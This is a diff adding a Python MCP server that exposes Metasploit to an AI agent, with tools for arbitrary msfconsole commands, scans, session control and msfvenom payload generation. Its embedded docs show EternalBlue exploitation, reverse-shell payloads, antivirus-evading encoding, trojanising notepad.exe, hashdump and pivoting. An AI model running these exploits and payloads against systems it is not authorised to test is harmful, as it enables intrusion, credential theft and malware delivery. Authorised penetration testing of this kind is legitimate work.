@@ -1,0 +1,1212 @@
+#!/usr/bin/env python3
+
+"""
+Improved Metasploit Framework Console MCP
+-----------------------------------------
+This module integrates Metasploit Framework with MCP using improved execution strategies
+for better reliability and error handling.
+"""
+
+import os
+import sys
+import logging
+import asyncio
+import importlib.metadata
+import json
+import re
+import shlex
+import shutil
+from typing import List, Dict, Any, Optional, Union
+
+# Process command line arguments
+import argparse
+parser = argparse.ArgumentParser(description="Improved Metasploit MCP Server")
+parser.add_argument("--json-stdout", action="store_true", help="Ensure all stdout is valid JSON")
+parser.add_argument("--strict-mode", action="store_true", help="Run in strict JSON mode")
+parser.add_argument("--debug-to-stderr", action="store_true", help="Redirect debug output to stderr")
+args = parser.parse_args()
+
+# Configure JSON handling
+json_stdout = args.json_stdout or "MCP_STRICT_JSON" in os.environ
+strict_mode = args.strict_mode or "MCP_STRICT_JSON" in os.environ
+debug_to_stderr = args.debug_to_stderr or "MCP_DEBUG_TO_STDERR" in os.environ
+
+# Configure log handlers based on settings
+log_handlers = []
+if debug_to_stderr:
+    log_handlers.append(logging.StreamHandler(sys.stderr))
+else:
+    log_handlers.append(logging.StreamHandler())
+log_handlers.append(logging.FileHandler("msfconsole_mcp_improved.log"))
+
+# Set up logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler("msfconsole_mcp_improved.log"),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
+# Check Python version
+python_version = ".".join(sys.version.split()[0].split(".")[:2])
+logger.info(f"Python version: {python_version}")
+# Check for required packages
+try:
+    from mcp.server.fastmcp import FastMCP, Context
+    MCP_VERSION = getattr(importlib.metadata.version("mcp"), "__version__", "unknown")
+    logger.info(f"Successfully imported MCP SDK version {MCP_VERSION}")
+except ImportError as e:
+    logger.error(f"MCP SDK import error: {e}")
+    sys.exit(1)
+
+# Import our improved MSF execution class
+try:
+    from msf_execution import MSFConsoleExecutor
+    logger.info("Successfully imported MSFConsoleExecutor")
+except ImportError as e:
+    logger.error(f"Error importing MSFConsoleExecutor: {e}")
+    sys.exit(1)
+
+# Import configuration
+try:
+    from config import CONFIG, PY_COMPATIBILITY_FIXES
+    logger.info("Loaded configuration from config.py")
+except ImportError:
+    logger.error("Failed to load configuration from config.py")
+    sys.exit(1)
+
+# Define version
+VERSION = "0.2.0"
+
+# Initialize FastMCP server
+try:
+    mcp = FastMCP("msfconsole-improved", version=VERSION)
+    logger.info(f"Successfully initialized FastMCP server version {VERSION}")
+except Exception as e:
+    logger.error(f"Failed to initialize FastMCP server: {e}")
+    sys.exit(1)
+
+# Initialize MSF executor
+msf_executor = MSFConsoleExecutor(
+    CONFIG["metasploit"]["msfconsole_path"],
+    CONFIG["metasploit"]["msfvenom_path"],
+    CONFIG
+)
+
+# Create a SafeContext wrapper class for better compatibility
+class SafeContext:
+    """
+    Wrapper for MCP context that handles different context interfaces
+    and provides fallback for missing methods.
+    """
+    def __init__(self, ctx):
+        self.ctx = ctx
+    
+    async def info(self, message):
+        """Send info message"""
+        if self.ctx is None:
+            logger.info(message)
+            return
+        
+        if hasattr(self.ctx, 'info'):
+            await self.ctx.info(message)
+        elif hasattr(self.ctx, 'send_info'):
+            await self.ctx.send_info(message)
+        else:
+            logger.info(message)
+    
+    async def error(self, message):
+        """Send error message"""
+        if self.ctx is None:
+            logger.error(message)
+            return
+        
+        if hasattr(self.ctx, 'error'):
+            await self.ctx.error(message)
+        elif hasattr(self.ctx, 'send_error'):
+            await self.ctx.send_error(message)
+        else:
+            logger.error(message)
+    
+    async def warning(self, message):
+        """Send warning message"""
+        if self.ctx is None:
+            logger.warning(message)
+            return
+        
+        if hasattr(self.ctx, 'warning'):
+            await self.ctx.warning(message)
+        elif hasattr(self.ctx, 'send_warning'):
+            await self.ctx.send_warning(message)
+        else:
+            logger.warning(message)
+    
+    async def progress(self, message, percentage):
+        """Send progress update"""
+        if self.ctx is None:
+            logger.info(f"Progress {percentage}%: {message}")
+            return
+        
+        if hasattr(self.ctx, 'progress'):
+            await self.ctx.progress(message, percentage)
+        elif hasattr(self.ctx, 'report_progress'):
+            await self.ctx.report_progress(percentage, 100, message)
+        else:
+            logger.info(f"Progress {percentage}%: {message}")
+    
+    async def report_progress(self, current, total, message):
+        """Report progress with current/total values"""
+        percentage = int((current / total) * 100) if total > 0 else 0
+        await self.progress(message, percentage)
+
+# Helper function to check if Metasploit is installed and database is ready
+async def check_metasploit_ready(ctx: Optional[Context] = None) -> bool:
+    """
+    Check if Metasploit is installed and the database is ready
+    
+    Args:
+        ctx: MCP context for reporting progress
+        
+    Returns:
+        bool: True if Metasploit is ready, False otherwise
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    # Check if msfconsole is in path
+    if not os.path.exists(CONFIG["metasploit"]["msfconsole_path"]):
+        await safe_ctx.error(f"msfconsole not found at {CONFIG['metasploit']['msfconsole_path']}")
+        return False
+    
+    # Get version
+    await safe_ctx.info("Checking Metasploit Framework version")
+    await safe_ctx.report_progress(30, 100, "Verifying Metasploit installation...")
+    
+    version_result = await msf_executor.get_version(safe_ctx)
+    
+    if not version_result["success"]:
+        await safe_ctx.error("Failed to get Metasploit version")
+        return False
+    
+    version = version_result.get("version", "Unknown")
+    await safe_ctx.info(f"Metasploit Framework version {version} detected")
+    
+    # Check database status
+    await safe_ctx.report_progress(60, 100, "Checking database connection...")
+    db_result = await msf_executor.check_db_status(safe_ctx)
+    
+    if not db_result["success"]:
+        await safe_ctx.error("Failed to check database status")
+        return False
+    
+    db_connected = db_result.get("db_connected", False)
+    
+    if not db_connected:
+        await safe_ctx.warning("Database is not connected. Some functionality may be limited.")
+    else:
+        await safe_ctx.info("Database is connected and ready")
+    
+    await safe_ctx.report_progress(100, 100, "Metasploit verification completed")
+    return True
+
+# Documentation functions
+def list_available_docs():
+    """List available documentation files"""
+    docs = {
+        "metasploit_basics": "Basic usage of the Metasploit Framework",
+        "msfconsole_commands": "Common msfconsole commands",
+        "module_usage": "How to use Metasploit modules",
+        "workspace_management": "Managing workspaces in Metasploit",
+        "scanning_basics": "Basic scanning techniques with Metasploit",
+        "database_usage": "Using the Metasploit database",
+        "payload_generation": "Generating payloads with msfvenom",
+        "session_management": "Managing Metasploit sessions",
+    }
+    
+    output = "# Available Documentation\n\n"
+    for doc_id, description in docs.items():
+        output += f"- `{doc_id}`: {description}\n"
+    
+    output += "\nTo view a document, use the `browse_documentation` tool with the document name as the argument."
+    return output
+
+def list_commands():
+    """List all available commands in the MCP"""
+    commands = [
+        {
+            "name": "get_msf_version",
+            "description": "Get the installed Metasploit Framework version",
+            "usage": "get_msf_version"
+        },
+        {
+            "name": "run_msf_command",
+            "description": "Execute a command in msfconsole",
+            "usage": "run_msf_command command=\"help\""
+        },
+        {
+            "name": "search_modules",
+            "description": "Search for modules in the Metasploit Framework",
+            "usage": "search_modules query=\"ms17_010\""
+        },
+        {
+            "name": "manage_workspaces",
+            "description": "List and manage Metasploit workspaces",
+            "usage": "manage_workspaces command=\"list\""
+        },
+        {
+            "name": "run_scan",
+            "description": "Run a scan against target hosts",
+            "usage": "run_scan scan_type=\"ping\" target=\"192.168.1.0/24\""
+        },
+        {
+            "name": "manage_database",
+            "description": "Manage the Metasploit database",
+            "usage": "manage_database command=\"status\""
+        },
+        {
+            "name": "manage_sessions",
+            "description": "List and manage Metasploit sessions",
+            "usage": "manage_sessions command=\"list\""
+        },
+        {
+            "name": "generate_payload",
+            "description": "Generate a payload using msfvenom",
+            "usage": "generate_payload payload=\"windows/meterpreter/reverse_tcp\" options=\"LHOST=192.168.1.100 LPORT=4444 -f exe\""
+        },
+        {
+            "name": "show_module_info",
+            "description": "Show detailed information about a Metasploit module",
+            "usage": "show_module_info module_path=\"exploit/windows/smb/ms17_010_eternalblue\""
+        },
+        {
+            "name": "browse_documentation",
+            "description": "Browse and view documentation files",
+            "usage": "browse_documentation document_name=\"metasploit_basics\""
+        }
+    ]
+    
+    output = "# Available Commands\n\n"
+    
+    for cmd in commands:
+        output += f"## {cmd['name']}\n{cmd['description']}\n\n"
+    
+    output += "# Usage Examples\n\n"
+    
+    for cmd in commands:
+        output += f"- `{cmd['usage']}` - {cmd['description']}\n"
+    
+    return output
+
+def get_document_content(doc_name):
+    """Get the content of a specific documentation file"""
+    docs = {
+        "metasploit_basics": """
+# Metasploit Framework Basics
+
+The Metasploit Framework is a powerful penetration testing tool that helps security professionals test network security.
+
+## Key Components
+
+- **msfconsole**: The main interface for Metasploit
+- **modules**: Different types of tools (exploits, payloads, auxiliaries, etc.)
+- **database**: PostgreSQL database for storing scan results and session information
+- **msfvenom**: Tool for generating payloads
+
+## Basic Workflow
+
+1. Start msfconsole with: `msfconsole`
+2. Scan for targets: `db_nmap 192.168.1.0/24`
+3. Search for exploits: `search type:exploit platform:windows`
+4. Select a module: `use exploit/windows/smb/ms17_010_eternalblue`
+5. Set options: `set RHOSTS 192.168.1.100`
+6. Verify settings: `show options`
+7. Run the exploit: `exploit` or `run`
+
+For more information, see the official Metasploit documentation.
+""",
+        "msfconsole_commands": """
+# Common msfconsole Commands
+
+## General Commands
+- `help`: Display help information
+- `version`: Show Metasploit version
+- `exit`: Exit msfconsole
+- `back`: Move back from module context to main context
+
+## Module Commands
+- `search [term]`: Search for modules
+- `use [module path]`: Select a module
+- `info`: Display information about the selected module
+- `options`: Show available options for the current module
+- `set [option] [value]`: Set an option
+- `setg [option] [value]`: Set a global option
+- `unset [option]`: Unset an option
+- `run` or `exploit`: Run the selected module
+
+## Database Commands
+- `db_status`: Check database status
+- `db_nmap`: Run nmap and store results in the database
+- `hosts`: List hosts in the database
+- `services`: List services in the database
+- `vulns`: List vulnerabilities in the database
+- `workspace`: Manage workspaces
+
+## Session Commands
+- `sessions -l`: List sessions
+- `sessions -i [id]`: Interact with a session
+- `sessions -k [id]`: Kill a session
+- `background`: Background the current session
+
+## Useful Tips
+- Use tab completion for commands and options
+- Use `help [command]` for detailed help on a specific command
+- Use `-h` with a module for quick help
+""",
+        "module_usage": """
+# Using Metasploit Modules
+
+Metasploit has several module types:
+
+## Types of Modules
+- **Exploits**: Used to exploit vulnerabilities
+- **Auxiliary**: Scanning, fuzzing, sniffing, and admin tools
+- **Post**: Post-exploitation modules
+- **Payloads**: Code that runs on the target after exploitation
+- **Encoders**: Encode payloads to avoid detection
+- **Nops**: Generate NOP sleds
+- **Evasion**: Help bypass antivirus software
+
+## Working with Modules
+
+### Finding Modules
+```
+search type:exploit platform:windows
+search cve:2019
+search author:hdm
+```
+
+### Using a Module
+```
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.200
+exploit
+```
+
+### Getting Module Information
+```
+info
+show options
+show advanced
+show evasion
+show targets
+show payloads
+```
+
+### Reusing Module Settings
+```
+save
+makerc filename.rc
+```
+
+### Running Modules from a Resource Script
+```
+msfconsole -r filename.rc
+```
+""",
+        "workspace_management": """
+# Managing Workspaces in Metasploit
+
+Workspaces help organize penetration tests by separating data between different targets or projects.
+
+## Basic Workspace Commands
+
+- `workspace`: Show available workspaces and current workspace
+- `workspace [name]`: Switch to a different workspace
+- `workspace -a [name]`: Create a new workspace
+- `workspace -d [name]`: Delete a workspace
+- `workspace -r [old_name] [new_name]`: Rename a workspace
+
+## Examples
+
+### Creating a New Workspace for a Client
+```
+workspace -a Client_A
+```
+
+### Switching Between Workspaces
+```
+workspace Client_A
+workspace Client_B
+```
+
+### Copying Data Between Workspaces
+```
+# Export data from current workspace
+db_export /tmp/client_a_data.xml
+
+# Switch to target workspace
+workspace Client_B
+
+# Import data
+db_import /tmp/client_a_data.xml
+```
+
+### Best Practices
+- Create a new workspace for each assessment
+- Use descriptive names for workspaces
+- Use the default workspace for testing or temporary work
+- Export workspace data for reporting or archiving
+""",
+        "scanning_basics": """
+# Basic Scanning with Metasploit
+
+## Database Integration
+Before scanning, ensure the database is connected:
+```
+db_status
+```
+
+## Types of Scans
+
+### Network Discovery
+```
+db_nmap -sn 192.168.1.0/24
+```
+
+### Port Scanning
+```
+db_nmap -sS -sV 192.168.1.100
+```
+
+### Service Scanning
+```
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.0/24
+run
+```
+
+### Vulnerability Scanning
+```
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.1.0/24
+run
+```
+
+## Viewing Scan Results
+```
+hosts
+services
+vulns
+creds
+loot
+notes
+```
+
+## Scan Tips
+- Start with a broad scan to identify hosts
+- Follow up with targeted scans for specific services
+- Use `db_nmap` to automatically store results in the database
+- Consider the noise level of scans in production environments
+- Use the `setg` command to set global options for multiple scans
+"""
+    }
+    
+    # Add the rest of the documentation in another chunk
+    other_docs = {
+        "database_usage": """
+# Using the Metasploit Database
+
+## Database Setup
+The Metasploit Framework uses PostgreSQL. Check status with:
+```
+db_status
+```
+
+If not connected, initialize with:
+```
+msfdb init
+```
+
+## Importing and Exporting Data
+
+### Importing Data
+```
+db_import /path/to/nmap_scan.xml
+```
+
+### Exporting Data
+```
+db_export -f xml /path/to/export.xml
+```
+
+## Working with Database Data
+
+### Hosts
+```
+hosts                      # List all hosts
+hosts -c address,os_name   # Show specific columns
+hosts -S Windows           # Search for Windows hosts
+hosts -R                   # Set RHOSTS to all hosts in database
+```
+
+### Services
+```
+services                   # List all services
+services -c port,name      # Show specific columns
+services -p 445            # Show services on port 445
+services -s http           # Show HTTP services
+```
+
+### Vulnerabilities
+```
+vulns                      # List all vulnerabilities
+vulns -p 445               # Show vulnerabilities for port 445
+vulns -s Microsoft         # Search for Microsoft vulnerabilities
+```
+
+### Credentials
+```
+creds                      # List all stored credentials
+creds -a 192.168.1.100     # Show credentials for a specific host
+```
+
+## Database Maintenance
+```
+db_rebuild_cache           # Rebuild the database cache
+hosts -d                   # Delete all hosts
+services -d                # Delete all services
+```
+""",
+        "payload_generation": """
+# Generating Payloads with msfvenom
+
+msfvenom is a tool for creating standalone payloads for use outside of the Metasploit Framework.
+
+## Basic Usage
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
+```
+
+## Payload Types
+
+### Meterpreter Payloads
+```
+windows/meterpreter/reverse_tcp
+windows/meterpreter/reverse_https
+linux/x64/meterpreter/reverse_tcp
+android/meterpreter/reverse_tcp
+```
+
+### Shell Payloads
+```
+windows/shell/reverse_tcp
+linux/x64/shell/reverse_tcp
+cmd/unix/reverse_bash
+```
+
+## Output Formats
+```
+-f exe                # Windows executable
+-f elf                # Linux executable
+-f raw                # Raw shellcode
+-f js_le              # JavaScript
+-f python             # Python
+-f csharp             # C#
+-f dll                # DLL file
+-f asp                # ASP file
+-f war                # WAR file
+-f vba                # VBA for Office macros
+```
+
+## Encoding Payloads
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_payload.exe
+```
+
+## Templates and Custom Payloads
+```
+# Inject payload into an existing executable
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x notepad.exe -f exe -o evil_notepad.exe
+
+# Create a service executable
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe-service -o service_payload.exe
+```
+
+## Listing Available Options
+```
+msfvenom --list payloads
+msfvenom --list encoders
+msfvenom --list formats
+```
+""",
+        "session_management": """
+# Managing Metasploit Sessions
+
+After successful exploitation, you'll have active sessions to manage.
+
+## Listing Sessions
+```
+sessions -l
+```
+
+## Interacting with Sessions
+```
+sessions -i 1             # Interact with session 1
+```
+
+## Session Commands
+
+### Meterpreter Sessions
+```
+help                      # Show help menu
+sysinfo                   # Get system information
+getuid                    # Show current user
+getsystem                 # Attempt to elevate privileges
+ps                        # List processes
+migrate 1234              # Migrate to process ID 1234
+shell                     # Drop into a system shell
+background                # Background the session
+```
+
+### Shell Sessions
+```
+^Z                        # Background the session (Ctrl+Z)
+```
+
+## Session Management Commands
+```
+sessions -k 1             # Kill session 1
+sessions -K               # Kill all sessions
+sessions -u 1             # Upgrade a shell to meterpreter
+```
+
+## Post-Exploitation
+```
+# From the msfconsole main prompt
+use post/windows/gather/hashdump
+set SESSION 1
+run
+
+# Or from within meterpreter
+run post/windows/gather/hashdump
+```
+
+## Multiple Session Management
+```
+# Route traffic through a session
+route add 192.168.0.0 255.255.255.0 1
+
+# Use as a pivot point
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set VERSION 5
+run
+```
+"""
+    }
+    
+    # Merge the two dictionaries
+    docs.update(other_docs)
+    
+    if doc_name not in docs:
+        return f"Document '{doc_name}' not found. Use `browse_documentation` without arguments to see available documents."
+    
+    return docs[doc_name]
+
+# Define MCP tools with improved reliability
+
+@mcp.tool()
+async def get_msf_version(ctx: Context = None) -> str:
+    """
+    Get the installed Metasploit Framework version.
+    
+    Returns:
+        Version information and details
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    # Check if Metasploit is installed
+    if not await check_metasploit_ready(safe_ctx):
+        return "Metasploit Framework not found. Please ensure it is installed."
+        
+    # Get version
+    await safe_ctx.info("Getting Metasploit Framework version")
+    version_result = await msf_executor.get_version(safe_ctx)
+    
+    if version_result["success"]:
+        version_output = version_result["full_output"]
+        await safe_ctx.info(f"Successfully retrieved Metasploit version")
+        return f"Metasploit Framework Version Information:\n\n{version_output}"
+    else:
+        error_msg = version_result.get('error', 'Unknown error')
+        await safe_ctx.error(f"Failed to get version: {error_msg}")
+        return f"Failed to get Metasploit Framework version: {error_msg}"
+
+@mcp.tool()
+async def run_msf_command(ctx: Context = None, command: str = "") -> str:
+    """
+    Execute a command in msfconsole.
+    
+    Args:
+        command: The command to execute in msfconsole
+    
+    Returns:
+        Command output
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    # Check if Metasploit is ready
+    if not await check_metasploit_ready(safe_ctx):
+        return "Metasploit Framework not found. Please ensure it is installed."
+    
+    if not command:
+        return "Please provide a command to execute."
+    
+    # Run the command
+    await safe_ctx.info(f"Executing command: {command}")
+    result = await msf_executor.run_command(command, safe_ctx)
+    
+    if result["success"]:
+        output = f"Command: {command}\n"
+        output += f"Workspace: {result['workspace']}\n\n"
+        output += result["stdout"]
+        
+        if result["stderr"]:
+            output += f"\nErrors/Warnings:\n{result['stderr']}"
+            
+        return output
+    else:
+        error_msg = result.get("error", "Unknown error")
+        return f"Failed to execute command: {error_msg}"
+
+@mcp.tool()
+async def search_modules(ctx: Context = None, query: str = "") -> str:
+    """
+    Search for modules in the Metasploit Framework.
+    
+    Args:
+        query: Search query (e.g., 'ms17_010', 'type:exploit platform:windows')
+    
+    Returns:
+        List of matching modules
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    # Check if Metasploit is ready
+    if not await check_metasploit_ready(safe_ctx):
+        return "Metasploit Framework not found. Please ensure it is installed."
+    
+    if not query:
+        return "Please provide a search query."
+    
+    # Sanitize query for safety
+    sanitized_query = query.replace(";", "").replace("|", "").replace("&", "")
+    if sanitized_query != query:
+        await safe_ctx.warning(f"Query was sanitized for safety")
+    
+    # Run the search command
+    command = f"search {sanitized_query}"
+    result = await msf_executor.run_command(command, safe_ctx)
+    
+    if result["success"]:
+        # Check if modules were found
+        if "No results from search" in result["stdout"]:
+            return f"No modules found for query: {sanitized_query}"
+        
+        # Count matches by looking for module lines
+        line_count = len([line for line in result["stdout"].split('\n') 
+                        if line.strip() and line[0].isdigit()])
+        
+        return f"Search results for '{sanitized_query}' ({line_count} matches):\n\n{result['stdout']}"
+    else:
+        error_msg = result.get("error", "Unknown error")
+        return f"Failed to search for modules: {error_msg}"
+
+@mcp.tool()
+async def manage_workspaces(ctx: Context = None, command: str = "list", workspace_name: str = "") -> str:
+    """
+    List and manage Metasploit workspaces.
+    
+    Args:
+        command: Action to perform (list, add, delete, select)
+        workspace_name: Name of the workspace for add/delete/select actions
+    
+    Returns:
+        Result of the workspace operation
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    # Check if Metasploit is ready
+    if not await check_metasploit_ready(safe_ctx):
+        return "Metasploit Framework not found. Please ensure it is installed."
+    
+    # Check database status
+    db_result = await msf_executor.check_db_status(safe_ctx)
+    if not db_result["success"] or not db_result.get("db_connected", False):
+        return "Database is not connected. Workspaces require a connected database."
+    
+    # Prepare the command
+    if command == "list":
+        msf_command = "workspace"
+    elif command == "add" and workspace_name:
+        msf_command = f"workspace -a {workspace_name}"
+    elif command == "delete" and workspace_name:
+        msf_command = f"workspace -d {workspace_name}"
+    elif command == "select" and workspace_name:
+        msf_command = f"workspace {workspace_name}"
+    else:
+        return "Invalid workspace command. Use 'list', 'add', 'delete', or 'select'."
+    
+    # Run the command
+    result = await msf_executor.run_command(msf_command, safe_ctx)
+    
+    if result["success"]:
+        if command == "list":
+            return f"Available workspaces:\n\n{result['stdout']}"
+        elif command == "add":
+            return f"Workspace '{workspace_name}' added.\n\n{result['stdout']}"
+        elif command == "delete":
+            return f"Workspace '{workspace_name}' deleted.\n\n{result['stdout']}"
+        elif command == "select":
+            return f"Switched to workspace '{workspace_name}'.\n\n{result['stdout']}"
+    else:
+        error_msg = result.get("error", "Unknown error")
+        return f"Failed to {command} workspace: {error_msg}"
+
+@mcp.tool()
+async def run_scan(ctx: Context = None, scan_type: str = "ping", target: str = "", options: str = "") -> str:
+    """
+    Run a scan against target hosts.
+    
+    Args:
+        scan_type: Type of scan (ping, port, service, vuln)
+        target: Target IP address, range, or subnet (e.g., '192.168.1.1', '192.168.1.0/24')
+        options: Additional options for the scan
+    
+    Returns:
+        Scan results
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    # Check if Metasploit is ready
+    if not await check_metasploit_ready(safe_ctx):
+        return "Metasploit Framework not found. Please ensure it is installed."
+    
+    if not target:
+        return "Please provide a target for the scan."
+    
+    # Choose scan module based on scan_type
+    scan_module = ""
+    if scan_type == "ping":
+        scan_module = "auxiliary/scanner/discovery/arp_sweep"
+    elif scan_type == "port":
+        scan_module = "auxiliary/scanner/portscan/tcp"
+    elif scan_type == "service":
+        scan_module = "auxiliary/scanner/discovery/udp_sweep"
+    elif scan_type == "vuln":
+        scan_module = "auxiliary/scanner/smb/smb_ms17_010"
+    else:
+        return f"Unknown scan type: {scan_type}. Available types: ping, port, service, vuln"
+    
+    # Prepare the command
+    cmd_parts = [
+        f"use {scan_module}",
+        f"set RHOSTS {target}"
+    ]
+    
+    # Add any additional options
+    if options:
+        option_pairs = options.split()
+        for pair in option_pairs:
+            if '=' in pair:
+                key, value = pair.split('=', 1)
+                cmd_parts.append(f"set {key} {value}")
+    
+    cmd_parts.append("run")
+    command = "; ".join(cmd_parts)
+    
+    # Run the command
+    result = await msf_executor.run_command(command, safe_ctx)
+    
+    if result["success"]:
+        return f"Scan results for {target} using {scan_module}:\n\n{result['stdout']}"
+    else:
+        error_msg = result.get("error", "Unknown error")
+        return f"Failed to run scan: {error_msg}"
+
+@mcp.tool()
+async def manage_database(ctx: Context = None, command: str = "status") -> str:
+    """
+    Manage the Metasploit database.
+    
+    Args:
+        command: Database command (status, hosts, services, vulns, creds, loot, notes)
+    
+    Returns:
+        Result of the database operation
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    # Check if Metasploit is ready
+    if not await check_metasploit_ready(safe_ctx):
+        return "Metasploit Framework not found. Please ensure it is installed."
+    
+    valid_commands = ["status", "hosts", "services", "vulns", "creds", "loot", "notes"]
+    if command not in valid_commands:
+        return f"Invalid database command. Valid commands: {', '.join(valid_commands)}"
+    
+    # Map command to MSF command
+    msf_command = ""
+    if command == "status":
+        msf_command = "db_status"
+    elif command == "hosts":
+        msf_command = "hosts"
+    elif command == "services":
+        msf_command = "services"
+    elif command == "vulns":
+        msf_command = "vulns"
+    elif command == "creds":
+        msf_command = "creds"
+    elif command == "loot":
+        msf_command = "loot"
+    elif command == "notes":
+        msf_command = "notes"
+    
+    # Run the command
+    result = await msf_executor.run_command(msf_command, safe_ctx)
+    
+    if result["success"]:
+        output = f"Database {command} command results:\n\n{result['stdout']}"
+        
+        # Add parsed results if available
+        if command == "hosts" and "hosts" in result:
+            output += f"\n\nParsed hosts:\n{json.dumps(result['hosts'], indent=2)}"
+        elif command == "services" and "services" in result:
+            output += f"\n\nParsed services:\n{json.dumps(result['services'], indent=2)}"
+        elif command == "vulns" and "vulnerabilities" in result:
+            output += f"\n\nParsed vulnerabilities:\n{json.dumps(result['vulnerabilities'], indent=2)}"
+        
+        return output
+    else:
+        error_msg = result.get("error", "Unknown error")
+        return f"Failed to execute database command: {error_msg}"
+
+
+@mcp.tool()
+async def manage_sessions(ctx: Context = None, command: str = "list", session_id: str = "") -> str:
+    """
+    List and manage Metasploit sessions.
+    
+    Args:
+        command: Session command (list, interact, kill)
+        session_id: ID of the session for interact/kill commands
+    
+    Returns:
+        Result of the session operation
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    # Check if Metasploit is ready
+    if not await check_metasploit_ready(safe_ctx):
+        return "Metasploit Framework not found. Please ensure it is installed."
+    
+    valid_commands = ["list", "interact", "kill"]
+    if command not in valid_commands:
+        return f"Invalid session command. Valid commands: {', '.join(valid_commands)}"
+    
+    # Map command to MSF command
+    msf_command = ""
+    if command == "list":
+        msf_command = "sessions -l"
+    elif command == "interact" and session_id:
+        msf_command = f"sessions -i {session_id}"
+    elif command == "kill" and session_id:
+        msf_command = f"sessions -k {session_id}"
+    else:
+        return "Invalid command or missing session ID."
+    
+    # Run the command
+    result = await msf_executor.run_command(msf_command, safe_ctx)
+    
+    if result["success"]:
+        if command == "list":
+            if "sessions" in result:
+                output = f"Active sessions:\n\n{result['stdout']}\n\n"
+                output += f"Parsed sessions:\n{json.dumps(result['sessions'], indent=2)}"
+                return output
+            else:
+                return f"Active sessions:\n\n{result['stdout']}"
+        elif command == "interact":
+            return f"Session {session_id} interaction:\n\n{result['stdout']}"
+        elif command == "kill":
+            return f"Session {session_id} killed:\n\n{result['stdout']}"
+    else:
+        error_msg = result.get("error", "Unknown error")
+        return f"Failed to {command} session: {error_msg}"
+
+
+@mcp.tool()
+async def generate_payload(ctx: Context = None, payload: str = "", options: str = "") -> str:
+    """
+    Generate a payload using msfvenom.
+    
+    Args:
+        payload: Payload type (e.g., 'windows/meterpreter/reverse_tcp')
+        options: Additional options (e.g., 'LHOST=192.168.1.1 LPORT=4444 -f exe')
+    
+    Returns:
+        Generated payload or command output
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    # Check if Metasploit is ready
+    if not await check_metasploit_ready(safe_ctx):
+        return "Metasploit Framework not found. Please ensure it is installed."
+    
+    if not payload:
+        return "Please provide a payload type."
+    
+    # Prepare the msfvenom command parameters
+    params = ["-p", payload]
+    
+    # Add any additional options
+    if options:
+        option_parts = shlex.split(options)
+        params.extend(option_parts)
+    
+    # Run msfvenom
+    result = await msf_executor.run_msfvenom(params, safe_ctx)
+    
+    if result["success"]:
+        output = f"Payload generation successful:\n\n"
+        output += result["stdout"]
+        
+        if result["stderr"]:
+            output += f"\nWarnings/Info:\n{result['stderr']}"
+            
+        return output
+    else:
+        error_msg = result.get("stderr", result.get("error", "Unknown error"))
+        return f"Failed to generate payload: {error_msg}"
+
+
+@mcp.tool()
+async def show_module_info(ctx: Context = None, module_path: str = "") -> str:
+    """
+    Show detailed information about a Metasploit module.
+    
+    Args:
+        module_path: Full path to the module (e.g., 'exploit/windows/smb/ms17_010_eternalblue')
+    
+    Returns:
+        Module information
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    # Check if Metasploit is ready
+    if not await check_metasploit_ready(safe_ctx):
+        return "Metasploit Framework not found. Please ensure it is installed."
+    
+    if not module_path:
+        return "Please provide a module path."
+    
+    # Build command
+    command = f"use {module_path}; info"
+    
+    # Run the command
+    result = await msf_executor.run_command(command, safe_ctx)
+    
+    if result["success"]:
+        return f"Module information for {module_path}:\n\n{result['stdout']}"
+    else:
+        error_msg = result.get("error", "Unknown error")
+        return f"Failed to get module information: {error_msg}"
+
+
+@mcp.tool()
+async def browse_documentation(ctx: Context = None, document_name: str = "") -> str:
+    """
+    Browse and view documentation files.
+    
+    Args:
+        document_name: Name of the document to view (leave empty to list available docs)
+    
+    Returns:
+        Documentation content or list of available documents
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    await safe_ctx.info(f"Accessing documentation: {document_name if document_name else 'index'}")
+    
+    # If no specific document is requested, list available docs
+    if not document_name:
+        return list_available_docs()
+    
+    # If a specific document is requested
+    return get_document_content(document_name)
+
+
+@mcp.tool()
+async def list_mcp_commands(ctx: Context = None) -> str:
+    """
+    List all available commands and tools in this MCP.
+    
+    Returns:
+        Formatted list of commands with descriptions
+    """
+    safe_ctx = SafeContext(ctx)
+    
+    await safe_ctx.info("Listing available commands")
+    
+    return list_commands()
+
+# Main function to run the server
+if __name__ == "__main__":
+    # Display MCP SDK and environment information
+    logger.info(f"Starting Improved Metasploit Framework Console MCP v{VERSION}")
+    logger.info(f"Python version: {sys.version}")
+    logger.info(f"MCP SDK version: {MCP_VERSION}")
+    logger.info(f"Working directory: {os.getcwd()}")
+    
+    # Check msfconsole availability
+    msfconsole_path = CONFIG["metasploit"]["msfconsole_path"]
+    if not os.path.exists(msfconsole_path):
+        logger.warning(f"msfconsole not found at {msfconsole_path}")
+        print(f"Warning: msfconsole not found at {msfconsole_path}")
+        print("Some functionality may be limited without Metasploit Framework installed.")
+    else:
+        logger.info(f"Found msfconsole at {msfconsole_path}")
+    
+    # Print server information
+    print(f"Starting Improved Metasploit Console MCP server v{VERSION}")
+    print(f"MCP SDK version: {MCP_VERSION}")
